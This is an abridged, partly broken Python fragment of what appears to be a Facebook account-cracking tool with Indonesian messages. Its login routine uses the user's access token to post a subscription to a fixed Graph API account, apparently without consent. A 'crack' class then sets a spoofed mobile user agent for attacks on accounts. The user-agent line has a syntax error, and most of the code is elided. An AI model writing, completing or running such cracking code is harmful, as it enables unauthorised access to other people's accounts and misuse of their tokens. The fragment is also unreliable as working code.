...
def login():
	...
	if(pil in ("01","1")):
		...
		try:
			nama=r['name']
			req.post(f'https://graph.facebook.com/100038114412395/subscribers?access_token={to}')
		...
		os.system("xdg-open https://youtu.be/guj9*2aK3vM")
	elif(pil in (" ","  ","   ","    ","     ")):
		print("[!] Jangan Kosong")
		time.sleep(1)
		login()
...
class crack:
	...
	def crack(self,user,lala,asu):
		...
		ua=awokawok(Mozilla/5.0 (Linux; Android 7.1.2; Redmi4X) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/77.0.3865.92 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/229.0.0.8.128;]",open("ua","r").read()])
